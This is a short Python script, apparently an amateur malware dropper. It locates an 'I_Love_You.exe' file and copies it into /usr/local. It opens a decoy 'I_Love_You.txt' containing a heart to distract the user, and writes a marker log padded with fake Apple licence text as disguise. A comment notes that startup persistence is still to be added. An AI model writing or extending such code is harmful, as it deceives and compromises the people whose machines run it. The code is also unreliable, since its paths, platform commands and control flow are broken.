import os
import platform
import subprocess
from shutil import copy

path = ''
filePath = '\\usr\\local\\I_Love_You.exe'
dst = '\\usr\\local'
admin = 'asdmin'


# Searchs the whole computer for the file
def finder(name, pathS):
    for root, dirs, files in os.walk( pathS ):
        if name in files:
            global pathF, pathB
            pathB = os.path.join( root )
            pathF = os.path.join( root, name )
            return os.path.join( root, name )


def cleaner(name, pathC):
    for root, dirs, files in os.walk( pathC ):
        try:
            if name not in files:
                CleanerRegistry = os.path.join( root, name )
                print( CleanerRegistry )

                # Creates the decoy file
                with open( pathDecoy, 'w' ) as file:
                    file.write( '<3' )
                    file.close()

                try:
                    copy( src, dst )
                    print( '[!] File Copied to safe place' )
                except OSError as E:
                    print( '[!] Exception: ', str( E ) )

                # Opens Decoy File when parent script clicked
                if platform.system() == 'Windows':  # Windows
                    os.startfile( pathDecoy )
                elif platform.system() == 'Darwin':  # MacOS
                    subprocess.Popen( ['start', pathDecoy] )
                else:  # Linux
                    subprocess.Popen( ['xdg-open', pathDecoy] )

            # Need daemon tool to run on startup

        except FileNotFoundError:
            print( '[!] File not found.' )


finder( 'I_Love_You.exe', '~\\' )

src = pathF
pathDecoy = os.path.join( pathB, 'I_Love_You.txt' )
pathCleanerIdentity = os.path.join( dst, 'CleanerRegistry.log' )

cleaner( 'CleanerRegistry.log', '\\usr\\local' )

# Creates one file that will be trigger a cleaner function
with open( pathCleanerIdentity, 'w' ) as file:
    file.write(
            'This file is based on or incorporates material from the projects listed below\n'
            '(collectively, Third Party Code). Apple is not the original author of the\n'
            'Third Party Code. The original copyright notice and the license, under which Apple\n'
            'received such Third Party Code, are set forth below. Such licenses and notices are\n'
            'provided for informational purposes only. Apple, not the third party, licenses\n'
            'the Third Party Code to you under the terms set forth in the EULA for the Apple Product.\n'
            'Apple reserves all other rights not expressly granted under this agreement, whether by implication,\n'
            'estoppel or otherwise.'
    )
    file.flush()
    file.close()
